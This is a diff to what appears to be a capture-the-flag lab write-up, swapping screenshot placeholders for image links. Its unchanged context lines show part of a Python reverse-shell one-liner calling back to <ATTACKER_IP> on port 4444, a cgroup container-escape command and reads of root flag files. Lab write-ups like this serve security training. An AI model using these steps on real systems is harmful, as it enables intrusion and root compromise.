@@ -151,7 +151,7 @@ ssh -i id_rsa emp@<TARGET_IP>
 cat flag1.txt
 ```
 
-[SCREEN01]
+<img width="716" height="316" alt="SCREEN01" src="https://github.com/user-attachments/assets/9789c606-f444-4198-8e9c-fa76af2fc4d4" />
 
 ---
 
@@ -212,7 +212,7 @@ echo -e "import socket,os,pty\nRHOST=\"<ATTACKER_IP>\"\nRPORT=4444\ns=socket.soc
 cat /root/flag2.txt
 ```
 
-[SCREEN02]
+<img width="532" height="249" alt="SCREEN02" src="https://github.com/user-attachments/assets/2528ed79-bb7b-4756-ad73-9ac66bcb93b3" />
 
 ---
 
@@ -262,3 +262,5 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```bash
 cat /home/vagrant/flag3.txt
 ```
+
+<img width="626" height="276" alt="SCREEN03" src="https://github.com/user-attachments/assets/d1ab7b07-7dce-4ee6-831d-ad8f2f2181aa" />
